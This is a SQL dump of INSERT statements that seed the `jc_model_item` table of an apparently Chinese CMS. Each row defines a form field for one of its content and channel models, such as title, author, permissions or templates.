INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (110,4,'titleColor','标题颜色',4,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (111,4,'description','摘要',5,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (112,4,'author','发布人',6,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (113,4,'viewGroupIds','浏览权限',7,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (114,4,'topLevel','固顶级别',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (115,4,'releaseDate','发布时间',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,5,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (116,4,'typeId','内容类型',9,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (117,4,'tplContent','指定模板',22,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (118,4,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (119,4,'attachments','资源上传',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (120,4,'txt','软件介绍',20,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (121,4,'softType','软件类型',12,'国产软件','国产软件,国外软件','100','3','30',NULL,NULL,6,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (122,4,'warrant','软件授权',13,'免费版','免费版,共享版','','3','30','','',6,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (123,4,'relatedLink','相关链接',14,'http://','','50','3','30','','',1,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (124,4,'demoUrl','演示地址',15,'http://',NULL,'60','3','30',NULL,NULL,1,0,0,1,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (125,5,'name','栏目名称',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (126,5,'path','访问路径',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (127,5,'title','meta标题',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (128,5,'keywords','meta关键字',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (129,5,'description','meta描述',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (130,5,'tplChannel','栏目模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (131,5,'tplContent','选择模型模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (132,5,'channelStatic','栏目静态化',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (133,5,'contentStatic','内容静态化',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (134,5,'priority','排列顺序',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (135,5,'display','显示',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (136,5,'docImg','文档图片',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (138,5,'afterCheck','审核后',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (139,5,'commentControl','评论',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (140,5,'allowUpdown','顶踩',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (141,5,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (142,5,'contriGroupIds','投稿权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (144,5,'link','外部链接',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (145,5,'titleImg','标题图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (146,5,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (147,5,'channelId','栏目',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,0,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (148,5,'title','标题',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (149,5,'shortTitle','简短标题',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (150,5,'titleColor','标题颜色',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (151,5,'tagStr','Tag标签',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (152,5,'description','摘要',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (153,5,'author','作者',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (154,5,'origin','来源',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (155,5,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (156,5,'topLevel','固顶级别',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (157,5,'releaseDate','发布时间',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,5,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (158,5,'typeId','内容类型',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (159,5,'tplContent','指定模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (160,5,'typeImg','类型图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (161,5,'titleImg','标题图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (162,5,'contentImg','内容图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (163,5,'pictures','图片集',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,0,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (164,6,'name','栏目名称',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (165,6,'path','访问路径',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (166,6,'title','meta标题',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,1,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (167,6,'keywords','meta关键字',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (168,6,'description','meta描述',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (169,6,'tplChannel','栏目模板',8,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (170,6,'tplContent','选择模型模板',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (171,6,'channelStatic','栏目静态化',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (172,6,'contentStatic','内容静态化',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,4,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (173,6,'priority','排列顺序',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,2,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (174,6,'display','显示',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (175,6,'docImg','文档图片',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (177,6,'afterCheck','审核后',11,NULL,NULL,NULL,NULL,NULL,NULL,NULL,6,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (178,6,'commentControl','评论',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (179,6,'allowUpdown','顶踩',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,8,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (180,6,'viewGroupIds','浏览权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (181,6,'contriGroupIds','投稿权限',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,7,0,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (183,6,'link','外部链接',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
INSERT INTO `jc_model_item` (`modelitem_id`,`model_id`,`field`,`item_label`,`priority`,`def_value`,`opt_value`,`text_size`,`area_rows`,`area_cols`,`help`,`help_position`,`data_type`,`is_single`,`is_channel`,`is_custom`,`is_display`,`is_required`,`image_width`,`image_height`) VALUES (184,6,'titleImg','标题图',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,1,1,0,1,0,NULL,NULL);
